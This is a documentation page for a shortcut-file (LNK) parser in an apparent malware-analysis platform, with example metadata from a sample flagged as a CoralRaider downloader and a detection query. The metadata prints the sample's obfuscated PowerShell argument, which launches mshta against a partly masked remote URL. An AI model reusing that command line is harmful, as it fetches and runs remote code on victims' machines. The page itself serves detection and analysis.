# LNK

## Supported formats

Windows Shortcut File (LNK)

## Description

A Microsoft Windows Shortcut file (LNK) is a file format designed to point to other files, folders, or programs on the system. Due to their flexibility, the `.lnk` files are often used by threat actors to execute malicious code. This backend can extract metadata from link files for further inspection.

## Symbols
This backend doesn't assign any symbols and doesn't create children objects.

## Example Metadata
```json
{
   "org": "ctx",
   "object_id": "8c73bdb8275953cfe9326eb7cfa93db7480833901e855430bfaee11854b2c892",
   "object_type": "LNK",
   "object_subtype": null,
   "recursion_level": 1,
   "size": 1170,
   "hashes": {
      "sha512": "114974e8933e5cf8f7417279fece058c5b4477d3d1e41f1c406edcd8d629ef7084c1c05ae046f76e906f3f04fd9c0c4d63a80ea375a0cb8d805ebe1363429de5",
      "sha1": "bb56184dfb9b94a7652aa67818a3d6afecb5f89b",
      "sha256": "8c73bdb8275953cfe9326eb7cfa93db7480833901e855430bfaee11854b2c892",
      "md5": "c5ee91fc3f7ba33c0cf8dd7927aa2212"
   },
   "ctime": 1726590031.313882,
   "ok": {
      "symbols": [
         "INFECTED",
         "INFECTED-CLAM-Lnk.Downloader.CoralRaider-10027128-0"
      ],
      "object_metadata": {
         "_backend_version": "0.1.0",
// highlight-start
         "extra_data": [
            {
               "SpecialFolderDataBlock": {
                  "block_signature": 2684354565,
                  "block_size": 16,
                  "offset": 221,
                  "special_folder_id": 37
               }
            },
            {
               "KnownFolderDataBlock": {
                  "block_signature": 2684354571,
                  "block_size": 28,
                  "known_folder_id": "1ac14e77-02e7-4e5d-b744-2eb1ae5198b7",
                  "offset": 221
               }
            },
            {
               "PropertyStoreDataBlock": {
                  "block_signature": 2684354569,
                  "block_size": 149,
                  "property_store": {
                     "serialized_property_storage": [
                        {
                           "format_id": "46588ae2-4cbc-4338-bbfc-139326986dce",
                           "serialized_property_value": [
                              {
                                 "IntegerName": {
                                    "id": 4,
                                    "reserved": 0,
                                    "value": {
                                       "LPWStr": "S-1-5-21-1058994278-4207698791-1477402829-500"
                                    },
                                    "value_size": 109
                                 }
                              }
                           ],
                           "storage_size": 137,
                           "version": 1397773105
                        }
                     ],
                     "store_size": 0
                  }
               }
            }
         ],
         "link_target_id_list": {
            "id_list": {
               "item_id_list": [
                  {
                     "RootFolderItem": {
                        "class_type": "0x1F",
                        "description": "My Computer (Computer)",
                        "shell_folder_id": "20d04fe0-3aea-1069-a2d8-08002b30309d",
                        "sort_index": 80
                     }
                  },
                  {
                     "VolumeShellItem": {
                        "blob": "0x2F433A5C00000000000000000000000000000000000000",
                        "class_type": "0x2F",
                        "flags": "0x0F",
                        "name": "C:\\"
                     }
                  },
                  {
                     "FileEntryShellItem": {
                        "class_type": "0x31",
                        "extension": [],
                        "file_attributes": 16,
                        "file_size": 0,
                        "flags": "0x01",
                        "modification_time": "(UNSET)",
                        "primary_name": {
                           "ANSI": "Windows"
                        },
                        "secondary_name": {
                           "ANSI": "@"
                        }
                     }
                  },
                  {
                     "FileEntryShellItem": {
                        "class_type": "0x31",
                        "extension": [],
                        "file_attributes": 16,
                        "file_size": 0,
                        "flags": "0x01",
                        "modification_time": "(UNSET)",
                        "primary_name": {
                           "ANSI": "System32"
                        },
                        "secondary_name": {
                           "ANSI": "B"
                        }
                     }
                  },
                  {
                     "FileEntryShellItem": {
                        "class_type": "0x31",
                        "extension": [],
                        "file_attributes": 16,
                        "file_size": 0,
                        "flags": "0x01",
                        "modification_time": "(UNSET)",
                        "primary_name": {
                           "ANSI": "WindowsPowerShell"
                        },
                        "secondary_name": {
                           "ANSI": "T"
                        }
                     }
                  },
                  {
                     "FileEntryShellItem": {
                        "class_type": "0x31",
                        "extension": [],
                        "file_attributes": 16,
                        "file_size": 0,
                        "flags": "0x01",
                        "modification_time": "(UNSET)",
                        "primary_name": {
                           "ANSI": "v1.0"
                        },
                        "secondary_name": {
                           "ANSI": ":"
                        }
                     }
                  },
                  {
                     "FileEntryShellItem": {
                        "class_type": "0x32",
                        "extension": [],
                        "file_attributes": 0,
                        "file_size": 0,
                        "flags": "0x02",
                        "modification_time": "(UNSET)",
                        "primary_name": {
                           "ANSI": "powershell.exe"
                        },
                        "secondary_name": {
                           "ANSI": "N"
                        }
                     }
                  }
               ]
            },
            "id_list_size": 525
         },
         "shell_link_header": {
            "access_time": "Not set",
            "creation_time": "Not set",
            "file_attributes_flag": [],
            "file_size": 0,
            "header_size": 76,
            "hot_key": "None",
            "icon_index": 115,
            "link_clsid": "00021401-0000-0000-c000-000000000046",
            "link_flags": [
               "HasLinkTargetIDList",
               "HasName",
               "HasRelativePath",
               "HasArguments",
               "HasIconLocation",
               "IsUnicode"
            ],
            "reserved1": 0,
            "reserved2": 0,
            "reserved3": 0,
            "show_command": "SW_SHOWMINNOACTIVE",
            "write_time": "Not set"
         },
         "string_data": {
            "command_line_arguments": ".(gp -pa 'HKLM:\\SOF*\\Clas*\\Applications\\msh*e').('PSChildName')https://fatXXXXXXXXXX.net/fatodex",
            "icon_location": "shell32.dll",
            "name_string": "shortcut",
            "relative_path": "..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         }
// highlight-end
      },
      "children": []
   }
}
```

## Example Queries
```
object_type == "LNK"
  && @match_object_meta($string_data.relative_path iregex("powershell.exe"))
  && @match_object_meta($string_data.command_line_arguments iregex("(http://|https://)"))
```
- This query matches a `LNK` object, which is set to call PowerShell with `http(s)://` arguments among other options.
